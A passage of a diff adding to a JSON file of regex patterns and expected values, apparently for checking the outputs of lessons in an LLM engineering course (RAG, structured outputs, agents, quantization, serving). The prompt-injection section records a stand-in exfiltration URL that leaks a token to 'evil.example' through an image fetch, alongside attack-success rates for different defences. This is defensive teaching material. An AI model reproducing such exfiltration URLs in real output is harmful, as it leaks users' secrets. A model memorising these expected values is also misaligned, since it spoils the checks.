@@ -270,5 +270,965 @@
       "pattern": "^hybrid \\((\\d+) misses\\)",
       "value": "3"
     }
+  },
+  "07-rag-pipeline": {
+    "s_chunks": {
+      "pattern": "^--- chunk size 20 words, overlap 5, top-k 3 ---\\nChunks indexed = (\\d+),",
+      "value": "38"
+    },
+    "s_words": {
+      "pattern": "^--- chunk size 20 words, overlap 5, top-k 3 ---\\nChunks indexed = \\d+, average words sent per question = ([\\d.]+)$",
+      "value": "42.0"
+    },
+    "s_recall": {
+      "pattern": "^--- chunk size 20 words, overlap 5, top-k 3 ---\\nChunks indexed = \\d+, average words sent per question = [\\d.]+\\nRetrieval recall@3 \\(right document\\) = ([\\d.]+)$",
+      "value": "0.929"
+    },
+    "s_ctx": {
+      "pattern": "^--- chunk size 20 words, overlap 5, top-k 3 ---\\nChunks indexed = \\d+, average words sent per question = [\\d.]+\\nRetrieval recall@3 \\(right document\\) = [\\d.]+\\nContext recall \\(fact inside retrieved text\\) = ([\\d.]+)$",
+      "value": "0.714"
+    },
+    "s_acc": {
+      "pattern": "^--- chunk size 20 words, overlap 5, top-k 3 ---\\nChunks indexed = \\d+, average words sent per question = [\\d.]+\\nRetrieval recall@3 \\(right document\\) = [\\d.]+\\nContext recall \\(fact inside retrieved text\\) = [\\d.]+\\nAnswer accuracy \\(fact in answer, right citation\\) = ([\\d.]+)$",
+      "value": "0.500"
+    },
+    "s_accfact": {
+      "pattern": "^--- chunk size 20 words, overlap 5, top-k 3 ---\\nChunks indexed = \\d+, average words sent per question = [\\d.]+\\nRetrieval recall@3 \\(right document\\) = [\\d.]+\\nContext recall \\(fact inside retrieved text\\) = [\\d.]+\\nAnswer accuracy \\(fact in answer, right citation\\) = [\\d.]+\\nAnswer accuracy when the fact was retrieved = ([\\d.]+)$",
+      "value": "0.700"
+    },
+    "l_chunks": {
+      "pattern": "^--- chunk size 60 words, overlap 15, top-k 3 ---\\nChunks indexed = (\\d+),",
+      "value": "12"
+    },
+    "l_words": {
+      "pattern": "^--- chunk size 60 words, overlap 15, top-k 3 ---\\nChunks indexed = \\d+, average words sent per question = ([\\d.]+)$",
+      "value": "91.1"
+    },
+    "l_recall": {
+      "pattern": "^--- chunk size 60 words, overlap 15, top-k 3 ---\\nChunks indexed = \\d+, average words sent per question = [\\d.]+\\nRetrieval recall@3 \\(right document\\) = ([\\d.]+)$",
+      "value": "0.929"
+    },
+    "l_ctx": {
+      "pattern": "^--- chunk size 60 words, overlap 15, top-k 3 ---\\nChunks indexed = \\d+, average words sent per question = [\\d.]+\\nRetrieval recall@3 \\(right document\\) = [\\d.]+\\nContext recall \\(fact inside retrieved text\\) = ([\\d.]+)$",
+      "value": "0.929"
+    },
+    "l_acc": {
+      "pattern": "^--- chunk size 60 words, overlap 15, top-k 3 ---\\nChunks indexed = \\d+, average words sent per question = [\\d.]+\\nRetrieval recall@3 \\(right document\\) = [\\d.]+\\nContext recall \\(fact inside retrieved text\\) = [\\d.]+\\nAnswer accuracy \\(fact in answer, right citation\\) = ([\\d.]+)$",
+      "value": "0.714"
+    },
+    "l_accfact": {
+      "pattern": "^--- chunk size 60 words, overlap 15, top-k 3 ---\\nChunks indexed = \\d+, average words sent per question = [\\d.]+\\nRetrieval recall@3 \\(right document\\) = [\\d.]+\\nContext recall \\(fact inside retrieved text\\) = [\\d.]+\\nAnswer accuracy \\(fact in answer, right citation\\) = [\\d.]+\\nAnswer accuracy when the fact was retrieved = ([\\d.]+)$",
+      "value": "0.769"
+    },
+    "backup_answer": {
+      "pattern": "^Extractive answer: (.+) \\[1\\]$",
+      "value": "Database backups run every night at 02:00 UTC on the primary cluster."
+    },
+    "sev1_answer": {
+      "pattern": "^    answer: (For a SEV1 .+) \\[1\\]$",
+      "value": "For a SEV1 the incident commander posts a status update every"
+    }
+  },
+  "08-structured-outputs": {
+    "call3_error": {
+      "pattern": "^call 3: INVALID: (.+)$",
+      "value": "not JSON: Extra data"
+    },
+    "call4_errors": {
+      "pattern": "^call 4: INVALID: (.+)$",
+      "value": "$: missing required 'title'; $: unexpected 'owner'; $.tags[1]: expected string, got int"
+    },
+    "first_try": {
+      "pattern": "^first-try validity = ([\\d.]+)$",
+      "value": "0.733"
+    },
+    "after_retries": {
+      "pattern": "^validity after 2 retries = ([\\d.]+)$",
+      "value": "0.884"
+    },
+    "independence": {
+      "pattern": "^independence estimate 1-\\(1-p\\)\\^3 = ([\\d.]+)$",
+      "value": "0.981"
+    },
+    "hard_retry": {
+      "pattern": "^hard inputs valid after retries = ([\\d.]+)$",
+      "value": "0.368"
+    },
+    "calls_per_request": {
+      "pattern": "^model calls per request = ([\\d.]+)$",
+      "value": "1.419"
+    },
+    "urgent_p": {
+      "pattern": "^\\s+\"urgent\"\\s+([\\d.]+)\\s",
+      "value": "0.407"
+    },
+    "high_raw": {
+      "pattern": "^\\s+\"high\"\\s+([\\d.]+)\\s",
+      "value": "0.408"
+    },
+    "high_masked": {
+      "pattern": "^\\s+\"high\"\\s+[\\d.]+\\s+([\\d.]+)$",
+      "value": "0.720"
+    },
+    "exact_valid": {
+      "pattern": "^exact P\\(valid\\) without mask = ([\\d.]+)$",
+      "value": "0.414"
+    },
+    "nomask_valid": {
+      "pattern": "^no mask\\s+valid = ([\\d.]+) ",
+      "value": "0.427"
+    },
+    "mask_valid": {
+      "pattern": "^mask\\s+valid = ([\\d.]+) ",
+      "value": "1.000"
+    },
+    "mass_removed": {
+      "pattern": "^mask\\s+valid.*mass removed per step = ([\\d.]+)$",
+      "value": "0.123"
+    }
+  },
+  "09-context-and-hallucination": {
+    "turn20_full": {
+      "pattern": "^turn 20: full history = +(\\d+) tokens",
+      "value": "8196"
+    },
+    "billed_full": {
+      "pattern": "^Input tokens billed over 20 turns, no window: (\\d+)$",
+      "value": "88742"
+    },
+    "drop_system_kept": {
+      "pattern": "^Drop oldest at turn 20: system prompt kept = (\\w+)$",
+      "value": "False"
+    },
+    "drop_oldest_turn": {
+      "pattern": "^Drop oldest at turn 20: oldest turn still present = (\\d+)$",
+      "value": "10"
+    },
+    "w10": {
+      "pattern": "^N = +10: weight on relevant key = ([\\d.]+)$",
+      "value": "0.6676"
+    },
+    "w1000": {
+      "pattern": "^N = +1000: weight on relevant key = ([\\d.]+)$",
+      "value": "0.0197"
+    },
+    "w1000_noisy": {
+      "pattern": "^N = +1000 with distractor scores ~ Normal\\(0, 1\\): weight = ([\\d.]+)$",
+      "value": "0.0121"
+    },
+    "pos_start": {
+      "pattern": "^relevant key at +start: weight = ([\\d.]+)$",
+      "value": "0.0360"
+    },
+    "pos_middle": {
+      "pattern": "^relevant key at middle: weight = ([\\d.]+)$",
+      "value": "0.0135"
+    },
+    "calibration_table": {
+      "pattern": "^(bin {10}count  mean confidence  accuracy\\n(?:.*\\n){4}.*)$",
+      "value": "bin          count  mean confidence  accuracy\n[0.5, 0.6)    408            0.552     0.539\n[0.6, 0.7)    381            0.649     0.591\n[0.7, 0.8)    406            0.748     0.682\n[0.8, 0.9)    392            0.852     0.719\n[0.9, 1.0)    413            0.951     0.780"
+    },
+    "ece_over": {
+      "pattern": "^ECE overconfident model = ([\\d.]+)$",
+      "value": "0.088"
+    },
+    "ece_cal": {
+      "pattern": "^ECE calibrated model = ([\\d.]+)$",
+      "value": "0.023"
+    },
+    "acc_all": {
+      "pattern": "^threshold 0\\.5: coverage = 1\\.000, accuracy when answering = ([\\d.]+)$",
+      "value": "0.663"
+    },
+    "cov_09": {
+      "pattern": "^threshold 0\\.9: coverage = ([\\d.]+),",
+      "value": "0.206"
+    },
+    "acc_09": {
+      "pattern": "^threshold 0\\.9: coverage = [\\d.]+, accuracy when answering = ([\\d.]+)$",
+      "value": "0.780"
+    }
+  },
+  "10-post-training": {
+    "total_words": {
+      "pattern": "^Conversation words = (\\d+), words that count",
+      "value": "20"
+    },
+    "loss_words": {
+      "pattern": "^Conversation words = \\d+, words that count in the loss = (\\d+)$",
+      "value": "10"
+    },
+    "sft0": {
+      "pattern": "^SFT step  0: mean P\\(demonstrated\\) = ([\\d.]+)",
+      "value": "0.145"
+    },
+    "sft30": {
+      "pattern": "^SFT step 30: mean P\\(demonstrated\\) = ([\\d.]+)",
+      "value": "0.800"
+    },
+    "dpo_example_b05": {
+      "pattern": "^beta=0\\.5  P\\(example\\)=([\\d.]+)",
+      "value": "0.878"
+    },
+    "gap_b05": {
+      "pattern": "^beta=0\\.5  log-ratio gap example-terse = ([\\d.]+)",
+      "value": "2.773"
+    },
+    "gap_b01": {
+      "pattern": "^beta=0\\.1  log-ratio gap example-terse = ([\\d.]+)",
+      "value": "13.856"
+    },
+    "kl_b05": {
+      "pattern": "^beta=0\\.5  log-ratio gap .* KL to reference = ([\\d.]+)$",
+      "value": "1.092"
+    },
+    "kl_b01": {
+      "pattern": "^beta=0\\.1  log-ratio gap .* KL to reference = ([\\d.]+)$",
+      "value": "1.577"
+    },
+    "margin": {
+      "pattern": "^ln\\(0\\.8/0\\.2\\) = ([\\d.]+)$",
+      "value": "1.386"
+    },
+    "ref_acc": {
+      "pattern": "^Reference accuracy = ([\\d.]+)$",
+      "value": "0.665"
+    },
+    "long_kl0": {
+      "pattern": "^proxy    reward, KL coef 0\\.0: P\\(long wrong\\)=([\\d.]+)",
+      "value": "1.000"
+    },
+    "acc_kl0": {
+      "pattern": "^proxy    reward, KL coef 0\\.0: .* accuracy=([\\d.]+)",
+      "value": "0.000"
+    },
+    "acc_kl2": {
+      "pattern": "^proxy    reward, KL coef 2\\.0: .* accuracy=([\\d.]+)",
+      "value": "0.638"
+    },
+    "acc_verifier": {
+      "pattern": "^verifier reward, KL coef 0\\.5: .* accuracy=([\\d.]+)",
+      "value": "0.936"
+    }
+  },
+  "11-evaluating-llm-apps": {
+    "n50_diff": {
+      "pattern": "^n=  50  paired difference ([+-][\\d.]+ \\[[^\\]]+\\])",
+      "value": "-0.0400 [-0.1400, +0.0600]"
+    },
+    "n50_candidate": {
+      "pattern": "^n=  50  baseline [\\d.]+ \\[[^\\]]+\\]  candidate ([\\d.]+)",
+      "value": "0.7600"
+    },
+    "n500_diff": {
+      "pattern": "^n= 500  paired difference ([+-][\\d.]+ \\[[^\\]]+\\])",
+      "value": "+0.0160 [-0.0100, +0.0420]"
+    },
+    "n2000_diff": {
+      "pattern": "^n=2000  paired difference ([+-][\\d.]+ \\[[^\\]]+\\])",
+      "value": "+0.0245 [+0.0110, +0.0380]"
+    },
+    "paired_needed": {
+      "pattern": "^Examples for a \\+-0\\.02 interval on the difference, paired: (\\d+)$",
+      "value": "957"
+    },
+    "unpaired_needed": {
+      "pattern": "^Examples for a \\+-0\\.02 interval on the difference, unpaired: (\\d+)$",
+      "value": "2955"
+    },
+    "regressed_diff": {
+      "pattern": "^Regressed candidate, n=500: paired difference ([+-][\\d.]+ \\[[^\\]]+\\])",
+      "value": "-0.0260 [-0.0580, +0.0040]"
+    },
+    "flip_rate": {
+      "pattern": "^Verdict flips when the order is swapped: ([\\d.]+)$",
+      "value": "0.415"
+    },
+    "first_both": {
+      "pattern": "^Picked whichever answer was shown first, both times: ([\\d.]+)$",
+      "value": "0.412"
+    },
+    "agree_one": {
+      "pattern": "^Agreement with humans, one order only: ([\\d.]+)$",
+      "value": "0.752"
+    },
+    "agree_consistent": {
+      "pattern": "^Agreement with humans, consistent verdicts only: ([\\d.]+)$",
+      "value": "0.953"
+    },
+    "consistent_share": {
+      "pattern": "^Share of pairs with a consistent verdict: ([\\d.]+)$",
+      "value": "0.585"
+    },
+    "raw_real": {
+      "pattern": "^real judge   raw agreement ([\\d.]+)",
+      "value": "0.850"
+    },
+    "kappa_real": {
+      "pattern": "^real judge .* kappa ([\\d.]+)$",
+      "value": "0.440"
+    },
+    "raw_always": {
+      "pattern": "^always pass  raw agreement ([\\d.]+)",
+      "value": "0.817"
+    }
+  },
+  "12-prompt-injection-and-security": {
+    "attack_count": {
+      "pattern": "^Scenarios: (\\d+) with an injected document",
+      "value": "7"
+    },
+    "scenario_count": {
+      "pattern": "^Scenarios: .* benign, (\\d+) total$",
+      "value": "12"
+    },
+    "leaked_url": {
+      "pattern": "^Browser fetches image: (\\S+)$",
+      "value": "https://evil.example/badge.png?d=tok_51c9e2"
+    },
+    "naive_attack": {
+      "pattern": "^naive\\s+attack success = \\d+/\\d+ = ([\\d.]+)",
+      "value": "1.000"
+    },
+    "warning_attack": {
+      "pattern": "^warning in system prompt\\s+attack success = \\d+/\\d+ = ([\\d.]+)",
+      "value": "0.714"
+    },
+    "careful_attack": {
+      "pattern": "^allowlist \\+ careful approval\\s+attack success = \\d+/\\d+ = ([\\d.]+)",
+      "value": "0.429"
+    },
+    "rubber_attack": {
+      "pattern": "^allowlist \\+ rubber-stamp approval\\s+attack success = \\d+/\\d+ = ([\\d.]+)",
+      "value": "0.714"
+    },
+    "filter_attack": {
+      "pattern": "^allowlist \\+ approval \\+ URL filter\\s+attack success = \\d+/\\d+ = ([\\d.]+)",
+      "value": "0.143"
+    },
+    "plan_attack": {
+      "pattern": "^plan before reading\\s+attack success = \\d+/\\d+ = ([\\d.]+)",
+      "value": "0.286"
+    },
+    "planfilter_attack": {
+      "pattern": "^plan before reading \\+ URL filter\\s+attack success = \\d+/\\d+ = ([\\d.]+)",
+      "value": "0.000"
+    },
+    "naive_task": {
+      "pattern": "^naive\\s+.*task success = \\d+/\\d+ = ([\\d.]+)$",
+      "value": "1.000"
+    },
+    "plan_task": {
+      "pattern": "^plan before reading\\s+attack.*task success = \\d+/\\d+ = ([\\d.]+)$",
+      "value": "0.917"
+    },
+    "matrix_table": {
+      "pattern": "^--- Which attacks got through \\(X = succeeded\\) ---\\n((?:.*\\n){7}.*)$",
+      "value": "config                               A1 A2 A3 A4 A5 A6 A7\nnaive                                 X  X  X  X  X  X  X\nwarning in system prompt              .  X  X  X  X  .  X\nallowlist + careful approval          .  .  .  X  .  X  X\nallowlist + rubber-stamp approval     .  .  X  X  X  X  X\nallowlist + approval + URL filter     .  .  .  .  .  .  X\nplan before reading                   .  .  .  X  .  X  .\nplan before reading + URL filter      .  .  .  .  .  .  ."
+    },
+    "setup_plan": {
+      "pattern": "^plan before reading  B5 doc-driven setup: task success = (\\w+)",
+      "value": "False"
+    }
+  },
+  "13-first-agent": {
+    "tooldefs": {
+      "pattern": "^Tool definitions alone: (\\d+) tokens",
+      "value": "142"
+    },
+    "prompt1": {
+      "pattern": "^  step 1: order_lookup\\(\\{\"order_id\": \"A-1001\"\\}\\).*\\[prompt (\\d+) tok\\]$",
+      "value": "160"
+    },
+    "prompt6": {
+      "pattern": "^  step 6: final answer, no tool call  \\[prompt (\\d+) tok\\]$",
+      "value": "498"
+    },
+    "calc_expr": {
+      "pattern": "^  step 5: calculator\\(\\{\"expression\": \"([^\"]+)\"\\}\\)",
+      "value": "3 * 12.50 + 2 * 40.00 + 1 * 7.25"
+    },
+    "agent_answer": {
+      "pattern": "^Agent answer: (.+)$",
+      "value": "Order A-1001 cannot ship in full (SKU-42 short by 1); total value 124.75"
+    },
+    "agent_calls": {
+      "pattern": "^Agent model calls = (\\d+)$",
+      "value": "6"
+    },
+    "agent_tokens": {
+      "pattern": "^Agent tokens = (\\d+)$",
+      "value": "2210"
+    },
+    "workflow_calls": {
+      "pattern": "^Workflow model calls = (\\d+)$",
+      "value": "1"
+    },
+    "workflow_tokens": {
+      "pattern": "^Workflow tokens = (\\d+)$",
+      "value": "141"
+    },
+    "ratio": {
+      "pattern": "^Token ratio agent/workflow = ([\\d.]+)$",
+      "value": "15.7"
+    },
+    "token_budget": {
+      "pattern": "^Task 1 with a 1500-token budget: (.+)$",
+      "value": "stopped by token budget before call 5 (calls 4, tokens 1207)"
+    },
+    "loop_result": {
+      "pattern": "^Loop result: (.+)$",
+      "value": "stopped by step budget after 5 model calls, tokens 1539"
+    }
+  },
+  "14-mcp": {
+    "protocol": {
+      "pattern": "^Negotiated protocol version = (\\S+)$",
+      "value": "2025-11-25"
+    },
+    "caps": {
+      "pattern": "^Server capabilities = (\\S+)$",
+      "value": "resources,tools"
+    },
+    "tools_count": {
+      "pattern": "^Tools advertised = (\\d+)$",
+      "value": "2"
+    },
+    "tools_bytes": {
+      "pattern": "^tools/list response size = (\\d+) bytes$",
+      "value": "430"
+    },
+    "ok_error": {
+      "pattern": "^get_order A-1003 isError = (\\w+)$",
+      "value": "false"
+    },
+    "bad_error": {
+      "pattern": "^get_order 1003 isError = (\\w+)$",
+      "value": "true"
+    },
+    "bad_text": {
+      "pattern": "^get_order 1003 text = (.+)$",
+      "value": "Invalid arguments: order_id must be a string, got int"
+    },
+    "pending": {
+      "pattern": "^Pending orders = (.+)$",
+      "value": "[\"A-1002\",\"A-1003\"]"
+    },
+    "missing_code": {
+      "pattern": "^prompts/list error code = (-?\\d+)$",
+      "value": "-32601"
+    },
+    "requests": {
+      "pattern": "^Client requests = (\\d+),",
+      "value": "8"
+    },
+    "notifications": {
+      "pattern": "^Client requests = \\d+, notifications = (\\d+),",
+      "value": "1"
+    },
+    "wire_bytes": {
+      "pattern": "^Total bytes on the wire = (\\d+)$",
+      "value": "2223"
+    },
+    "initialized_line": {
+      "pattern": "^C->S (\\{\"jsonrpc\":\"2\\.0\",\"method\":\"notifications/initialized\"\\})$",
+      "value": "{\"jsonrpc\":\"2.0\",\"method\":\"notifications/initialized\"}"
+    },
+    "bad_call": {
+      "pattern": "^C->S (\\{\"id\":4,.*)$",
+      "value": "{\"id\":4,\"jsonrpc\":\"2.0\",\"method\":\"tools/call\",\"params\":{\"arguments\":{\"order_id\":1003},\"name\":\"get_order\"}}"
+    },
+    "bad_reply": {
+      "pattern": "^S->C (\\{\"id\":4,.*)$",
+      "value": "{\"id\":4,\"jsonrpc\":\"2.0\",\"result\":{\"content\":[{\"text\":\"Invalid arguments: order_id must be a string, got int\",\"type\":\"text\"}],\"isError\":true}}"
+    }
+  },
+  "15-agent-failures": {
+    "none_success": {
+      "pattern": "^no guards\\s+([\\d.]+)\\s",
+      "value": "0.690"
+    },
+    "budget_success": {
+      "pattern": "^\\+ step budget\\s+([\\d.]+)\\s",
+      "value": "0.609"
+    },
+    "loop_success": {
+      "pattern": "^\\+ loop detection\\s+([\\d.]+)\\s",
+      "value": "0.774"
+    },
+    "struct_success": {
+      "pattern": "^\\+ structured errors\\s+([\\d.]+)\\s",
+      "value": "0.830"
+    },
+    "retry_success": {
+      "pattern": "^\\+ idempotent retries\\s+([\\d.]+)\\s",
+      "value": "0.946"
+    },
+    "none_calls": {
+      "pattern": "^no guards\\s+[\\d.]+\\s+([\\d.]+)\\s",
+      "value": "14.52"
+    },
+    "none_loop_rate": {
+      "pattern": "^no guards\\s+[\\d.]+\\s+[\\d.]+\\s+([\\d.]+)\\s",
+      "value": "0.248"
+    },
+    "none_dups": {
+      "pattern": "^no guards\\s+[\\d.]+\\s+[\\d.]+\\s+[\\d.]+\\s+(\\d+)$",
+      "value": "2346"
+    },
+    "retry_dups": {
+      "pattern": "^\\+ idempotent retries\\s+[\\d.]+\\s+[\\d.]+\\s+[\\d.]+\\s+(\\d+)$",
+      "value": "0"
+    },
+    "p95n10_sim": {
+      "pattern": "^p=0\\.95 n=10  analytic p\\*\\*n=[\\d.]+  simulated=([\\d.]+)$",
+      "value": "0.614"
+    },
+    "p95n50_sim": {
+      "pattern": "^p=0\\.95 n=50  analytic p\\*\\*n=[\\d.]+  simulated=([\\d.]+)$",
+      "value": "0.091"
+    },
+    "pass1": {
+      "pattern": "^pass@1 = ([\\d.]+)$",
+      "value": "0.780"
+    },
+    "passat3": {
+      "pattern": "^pass@3 = ([\\d.]+)  ",
+      "value": "0.971"
+    },
+    "passhat3": {
+      "pattern": "^pass\\^3 = ([\\d.]+)  ",
+      "value": "0.531"
+    },
+    "trace_repeat": {
+      "pattern": "^  issue_refund\\(order=1042,step=4\\) -> repeat of last completed call, executed again   x(\\d+)$",
+      "value": "34"
+    }
+  },
+  "16-small-network-from-scratch": {
+    "param_count": {
+      "pattern": "^parameter count = (\\d+)$",
+      "value": "82"
+    },
+    "untrained_loss": {
+      "pattern": "^untrained val loss = ([\\d.]+) ",
+      "value": "0.899"
+    },
+    "gradcheck": {
+      "pattern": "^correct backprop: max relative error below 1e-6 = (\\w+)$",
+      "value": "True"
+    },
+    "buggy_error": {
+      "pattern": "^buggy backprop \\(tanh derivative left out\\): max relative error = ([\\d.]+)$",
+      "value": "1.000"
+    },
+    "steps_per_epoch": {
+      "pattern": "^steps per epoch = (\\d+)$",
+      "value": "13"
+    },
+    "small_train_acc": {
+      "pattern": "^final train acc = ([\\d.]+), final val acc",
+      "value": "0.978"
+    },
+    "small_val_acc": {
+      "pattern": "^final train acc = [\\d.]+, final val acc = ([\\d.]+)$",
+      "value": "0.985"
+    },
+    "big_params": {
+      "pattern": "^parameters = (\\d+), training points = 30$",
+      "value": "502"
+    },
+    "overfit_val_loss_300": {
+      "pattern": "^no weight decay:\\n  epoch  300  train loss [\\d.]+ acc [\\d.]+  \\|  val loss ([\\d.]+) acc",
+      "value": "0.413"
+    },
+    "overfit_val_loss_final": {
+      "pattern": "^no decay, final: train acc [\\d.]+, val acc [\\d.]+, val loss ([\\d.]+)$",
+      "value": "0.632"
+    },
+    "overfit_train_acc": {
+      "pattern": "^no decay, final: train acc ([\\d.]+),",
+      "value": "0.967"
+    },
+    "overfit_val_acc": {
+      "pattern": "^no decay, final: train acc [\\d.]+, val acc ([\\d.]+),",
+      "value": "0.800"
+    },
+    "early_epoch": {
+      "pattern": "^early stopping: best val loss [\\d.]+ at epoch (\\d+),",
+      "value": "16"
+    },
+    "early_val_acc": {
+      "pattern": "^early stopping: best val loss [\\d.]+ at epoch \\d+, val acc there ([\\d.]+)$",
+      "value": "0.812"
+    },
+    "decay_val_acc": {
+      "pattern": "^weight decay, final: train acc [\\d.]+, val acc ([\\d.]+),",
+      "value": "0.860"
+    }
+  },
+  "17-fine-tuning-lora": {
+    "pre_a": {
+      "pattern": "^Pretrained A_test = ([\\d.]+)$",
+      "value": "0.093"
+    },
+    "pre_b": {
+      "pattern": "^Pretrained B_test = ([\\d.]+)$",
+      "value": "1.057"
+    },
+    "full_b_train": {
+      "pattern": "^full\\s+trainable=4096\\s+B_train=([\\d.]+)",
+      "value": "0.000"
+    },
+    "full_b": {
+      "pattern": "^full\\s+trainable=4096.*B_test=([\\d.]+)",
+      "value": "0.631"
+    },
+    "full_a": {
+      "pattern": "^full\\s+trainable=4096.*A_test=([\\d.]+)$",
+      "value": "0.995"
+    },
+    "r1_b": {
+      "pattern": "^lora r=1\\s+trainable=.*B_test=([\\d.]+)",
+      "value": "0.866"
+    },
+    "r1_a": {
+      "pattern": "^lora r=1\\s+trainable=.*A_test=([\\d.]+)$",
+      "value": "0.361"
+    },
+    "r4_b": {
+      "pattern": "^lora r=4\\s+trainable=.*B_test=([\\d.]+)",
+      "value": "0.404"
+    },
+    "r4_a": {
+      "pattern": "^lora r=4\\s+trainable=.*A_test=([\\d.]+)$",
+      "value": "0.817"
+    },
+    "r16_b": {
+      "pattern": "^lora r=16\\s+trainable=.*B_test=([\\d.]+)",
+      "value": "0.555"
+    },
+    "trueb_a": {
+      "pattern": "^true B\\s+trainable=.*A_test=([\\d.]+)$",
+      "value": "1.045"
+    },
+    "init_gap": {
+      "pattern": "^Max \\|\\(W \\+ BA\\) - W\\| before any LoRA step, over all ranks = ([\\d.]+)$",
+      "value": "0.0000"
+    },
+    "random_gap": {
+      "pattern": "^Same gap if B were random instead of zero \\(r=4\\) = ([\\d.]+)$",
+      "value": "0.5425"
+    },
+    "r8_params": {
+      "pattern": "^LoRA r=8\\s+params = ([\\d,]+)",
+      "value": "65,536"
+    },
+    "stack_params": {
+      "pattern": "^32 layers x 2 matrices \\(q, v\\) at r=8 = ([\\d,]+) trainable params$",
+      "value": "4,194,304"
+    }
+  },
+  "18-quantization": {
+    "outlier_ratio": {
+      "pattern": "^Largest \\|w\\| in an outlier column / median column max = ([\\d.]+)$",
+      "value": "28.7"
+    },
+    "int8_tensor_out": {
+      "pattern": "^int8 per-tensor +weight_rel_err=[\\d.]+ +output_rel_err=([\\d.]+)",
+      "value": "0.0727"
+    },
+    "int8_g64_out": {
+      "pattern": "^int8 group-64 +weight_rel_err=[\\d.]+ +output_rel_err=([\\d.]+)",
+      "value": "0.0188"
+    },
+    "int4_tensor_out": {
+      "pattern": "^int4 per-tensor +weight_rel_err=[\\d.]+ +output_rel_err=([\\d.]+)",
+      "value": "0.4066"
+    },
+    "int4_channel_out": {
+      "pattern": "^int4 per-channel +weight_rel_err=[\\d.]+ +output_rel_err=([\\d.]+)",
+      "value": "0.3522"
+    },
+    "int4_g32_out": {
+      "pattern": "^int4 group-32 +weight_rel_err=[\\d.]+ +output_rel_err=([\\d.]+)",
+      "value": "0.1645"
+    },
+    "int4_g32_cos": {
+      "pattern": "^int4 group-32 +weight_rel_err=[\\d.]+ +output_rel_err=[\\d.]+ +cosine=([\\d.]+)$",
+      "value": "0.9864"
+    },
+    "clean_out": {
+      "pattern": "^int4 per-tensor without outliers output_rel_err=([\\d.]+)$",
+      "value": "0.1766"
+    },
+    "clip99_out": {
+      "pattern": "^int4 tensor clip 0\\.99 +weight_rel_err=[\\d.]+ +output_rel_err=([\\d.]+)",
+      "value": "0.7852"
+    },
+    "mixed_out": {
+      "pattern": "^int4 \\+ fp outlier cols weight_rel_err=[\\d.]+ +output_rel_err=([\\d.]+)",
+      "value": "0.0685"
+    },
+    "relu_sym": {
+      "pattern": "^ReLU outputs int4 symmetric rel_err=([\\d.]+)$",
+      "value": "0.1505"
+    },
+    "relu_asym": {
+      "pattern": "^ReLU outputs int4 asymmetric rel_err=([\\d.]+)$",
+      "value": "0.0689"
+    },
+    "memory_table": {
+      "pattern": "^(model +fp16 +int8 +int4\\n7B .*\\n13B .*\\n70B .*)$",
+      "value": "model       fp16      int8      int4\n7B        14.0GB     7.0GB     3.5GB\n13B       26.0GB    13.0GB     6.5GB\n70B      140.0GB    70.0GB    35.0GB"
+    },
+    "group_bits": {
+      "pattern": "^int4 group-64 with one fp16 scale per group = ([\\d.]+) bits per weight$",
+      "value": "4.25"
+    },
+    "kv_total": {
+      "pattern": "^KV cache total = ([\\d.]+) GB$",
+      "value": "8.59"
+    }
+  },
+  "19-inference-serving": {
+    "weight_ms": {
+      "pattern": "^Weight read per decode step = ([\\d.]+) ms$",
+      "value": "7.00"
+    },
+    "bound1": {
+      "pattern": "^Upper bound at batch 1 = ([\\d.]+) tokens/s$",
+      "value": "142.9"
+    },
+    "static_tput": {
+      "pattern": "^static throughput = (\\d+) tokens/s$",
+      "value": "492"
+    },
+    "cont_tput": {
+      "pattern": "^continuous throughput = (\\d+) tokens/s$",
+      "value": "790"
+    },
+    "static_ttft_p50": {
+      "pattern": "^static TTFT p50 = ([\\d.]+) s",
+      "value": "19.15"
+    },
+    "cont_ttft_p50": {
+      "pattern": "^continuous TTFT p50 = ([\\d.]+) s",
+      "value": "0.04"
+    },
+    "static_lat_p95": {
+      "pattern": "^static latency p50 = [\\d.]+ s, p95 = ([\\d.]+) s$",
+      "value": "39.35"
+    },
+    "cont_lat_p95": {
+      "pattern": "^continuous latency p50 = [\\d.]+ s, p95 = ([\\d.]+) s$",
+      "value": "4.89"
+    },
+    "static_util": {
+      "pattern": "^static slot utilization = ([\\d.]+)$",
+      "value": "0.308"
+    },
+    "cont_util": {
+      "pattern": "^continuous slot utilization = ([\\d.]+)$",
+      "value": "0.460"
+    },
+    "kv_token": {
+      "pattern": "^KV cache per token = ([\\d.]+) MiB$",
+      "value": "0.50"
+    },
+    "waste_contig": {
+      "pattern": "^Waste with contiguous 2048-token reservation = ([\\d.]+)$",
+      "value": "0.595"
+    },
+    "waste_paged": {
+      "pattern": "^Waste with 16-token pages = ([\\d.]+)$",
+      "value": "0.009"
+    },
+    "fit_paged": {
+      "pattern": "^Requests that fit in 40 GiB, paged \\(average\\) = (\\d+)$",
+      "value": "97"
+    },
+    "fit_contig": {
+      "pattern": "^Requests that fit in 40 GiB, contiguous = (\\d+)$",
+      "value": "40"
+    }
+  },
+  "20-cost-latency-reliability": {
+    "cost_large": {
+      "pattern": "^1 large only\\s+([\\d.]+)",
+      "value": "9.22"
+    },
+    "cost_router": {
+      "pattern": "^2 router small->large\\s+([\\d.]+)",
+      "value": "5.06"
+    },
+    "cost_prompt_cache": {
+      "pattern": "^3 \\+ prompt cache\\s+([\\d.]+)",
+      "value": "3.26"
+    },
+    "cost_response_cache": {
+      "pattern": "^4 \\+ response cache\\s+([\\d.]+)",
+      "value": "2.46"
+    },
+    "p95_large": {
+      "pattern": "^1 large only\\s+\\S+\\s+\\S+\\s+([\\d.]+)",
+      "value": "10.46"
+    },
+    "p95_router": {
+      "pattern": "^2 router small->large\\s+\\S+\\s+\\S+\\s+([\\d.]+)",
+      "value": "10.83"
+    },
+    "quality_large": {
+      "pattern": "^1 large only(?:\\s+\\S+){4}\\s+([\\d.]+)",
+      "value": "0.905"
+    },
+    "quality_router": {
+      "pattern": "^2 router small->large(?:\\s+\\S+){4}\\s+([\\d.]+)",
+      "value": "0.873"
+    },
+    "escal_router": {
+      "pattern": "^2 router small->large(?:\\s+\\S+){6}\\s+([\\d.]+)$",
+      "value": "0.504"
+    },
+    "p99_flaky": {
+      "pattern": "^5 flaky, no safeguards(?:\\s+\\S+){3}\\s+([\\d.]+)",
+      "value": "30.61"
+    },
+    "avail_flaky": {
+      "pattern": "^5 flaky, no safeguards(?:\\s+\\S+){5}\\s+([\\d.]+)",
+      "value": "0.923"
+    },
+    "p99_resilient": {
+      "pattern": "^6 flaky, retry\\+fallback(?:\\s+\\S+){3}\\s+([\\d.]+)",
+      "value": "15.54"
+    },
+    "ttft_p50": {
